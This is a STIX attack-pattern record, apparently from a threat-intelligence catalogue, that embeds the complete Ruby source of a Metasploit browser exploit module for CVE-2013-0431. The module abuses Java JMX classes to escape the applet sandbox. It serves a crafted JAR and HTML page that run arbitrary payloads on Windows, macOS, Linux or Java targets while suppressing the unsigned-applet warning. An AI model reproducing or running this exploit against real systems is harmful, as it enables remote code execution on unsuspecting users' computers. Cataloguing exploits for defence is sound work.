{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9e750495-73e1-43e0-8214-b77c46ca8130",
    "created": "2024-08-14T17:05:58.6675Z",
    "modified": "2024-08-14T17:05:58.667504Z",
    "name": "Java Applet JMX Remote Code Execution",
    "description": " This module abuses the JMX classes from a Java Applet to run arbitrary Java code outside of the sandbox as exploited in the wild in February of 2013. Additionally this module bypasses default security settings introduced in Java 7 Update 10 to run unsigned applet without displaying any warning to the user.  'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/java_jre17_jmxbean_2.rb",
            "external_id": "java_jre17_jmxbean_2.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-0431"
        },
        {
            "source_name": "reference",
            "url": "http://www.security-explorations.com/materials/SE-2012-01-ORACLE-8.pdf"
        },
        {
            "source_name": "reference",
            "url": "http://www.security-explorations.com/materials/SE-2012-01-ORACLE-9.pdf"
        },
        {
            "source_name": "reference",
            "url": "http://security-obscurity.blogspot.com.es/2013/01/about-new-java-0-day-vulnerability.html"
        },
        {
            "source_name": "reference",
            "url": "http://pastebin.com/QWU1rqjf"
        },
        {
            "source_name": "reference",
            "url": "http://malware.dontneedcoffee.com/2013/02/cve-2013-0431-java-17-update-11.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({ :javascript => false })\n\n  def initialize( info = {} )\n\n    super( update_info( info,\n      'Name'          => 'Java Applet JMX Remote Code Execution',\n      'Description'   => %q{\n          This module abuses the JMX classes from a Java Applet to run arbitrary Java code\n        outside of the sandbox as exploited in the wild in February of 2013. Additionally,\n        this module bypasses default security settings introduced in Java 7 Update 10 to run\n        unsigned applet without displaying any warning to the user.\n      },\n      'License'       => MSF_LICENSE,\n      'Author'        =>\n        [\n          'Unknown', # Vulnerability discovery and exploit in the wild\n          'Adam Gowdiak', # Vulnerability discovery\n          'SecurityObscurity', # Exploit analysis and deobfuscation\n          'juan vazquez' # Metasploit module\n        ],\n      'References'    =>\n        [\n          [ 'CVE', '2013-0431' ],\n          [ 'OSVDB', '89613' ],\n          [ 'BID', '57726' ],\n          [ 'URL', 'http://www.security-explorations.com/materials/SE-2012-01-ORACLE-8.pdf' ],\n          [ 'URL', 'http://www.security-explorations.com/materials/SE-2012-01-ORACLE-9.pdf' ],\n          [ 'URL', 'http://security-obscurity.blogspot.com.es/2013/01/about-new-java-0-day-vulnerability.html' ],\n          [ 'URL', 'http://pastebin.com/QWU1rqjf' ],\n          [ 'URL', 'http://malware.dontneedcoffee.com/2013/02/cve-2013-0431-java-17-update-11.html' ]\n        ],\n      'Platform'      => %w{ java linux osx win },\n      'Payload'       => { 'Space' => 20480, 'BadChars' => '', 'DisableNops' => true },\n      'Targets'       =>\n        [\n          [ 'Generic (Java Payload)',\n            {\n              'Platform' => ['java'],\n              'Arch' => ARCH_JAVA,\n            }\n          ],\n          [ 'Windows x86 (Native Payload)',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_X86,\n            }\n          ],\n          [ 'Mac OS X x86 (Native Payload)',\n            {\n              'Platform' => 'osx',\n              'Arch' => ARCH_X86,\n            }\n          ],\n          [ 'Linux x86 (Native Payload)',\n            {\n              'Platform' => 'linux',\n              'Arch' => ARCH_X86,\n            }\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2013-01-19'\n    ))\n  end\n\n  def on_request_uri(cli, request)\n    print_status(\"handling request for #{request.uri}\")\n\n    case request.uri\n    when /\\.jar$/i\n      print_status(\"Sending JAR\")\n      send_response( cli, generate_jar, { 'Content-Type' => \"application/octet-stream\" } )\n    when /\\/$/\n      print_status(\"Sending HTML\")\n      send_response_html(cli, generate_html, { 'Content-Type' => 'text/html' })\n    else\n      send_redirect(cli, get_resource() + '/', '')\n    end\n  end\n\n  def generate_jar\n    paths = [\n      [ \"Exploit.ser\" ],\n      [ \"Exploit.class\" ],\n      [ \"B.class\" ]\n    ]\n\n    p = regenerate_payload(cli)\n\n    jar  = p.encoded_jar\n\n    paths.each do |path|\n      1.upto(path.length - 1) do |idx|\n        full = path[0,idx].join(\"/\") + \"/\"\n        if !(jar.entries.map{|e|e.name}.include?(full))\n          jar.add_file(full, '')\n        end\n      end\n      fd = File.open(File.join( Msf::Config.data_directory, \"exploits\", \"cve-2013-0431\", path ), \"rb\")\n      data = fd.read(fd.stat.size)\n      jar.add_file(path.join(\"/\"), data)\n      fd.close\n    end\n    return  jar.pack\n  end\n\n  def generate_html\n    html = <<-EOF\n<html>\n<script language=\"Javascript\">\n\nvar _app = navigator.appName;\n\nif (_app == 'Microsoft Internet Explorer') {\ndocument.write('<applet archive=\"#{rand_text_alpha(4+rand(4))}.jar\" object=\"Exploit.ser\"></applet>');\n} else {\ndocument.write('<embed object=\"Exploit.ser\" type=\"application/x-java-applet;version=1.6\" archive=\"#{rand_text_alpha(4+rand(4))}.jar\"></embed>');\n}\n\n</script>\n</html>\n    EOF\n    return html\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-01-19",
    "x_mitre_platforms": [
        "linux'"
    ]
}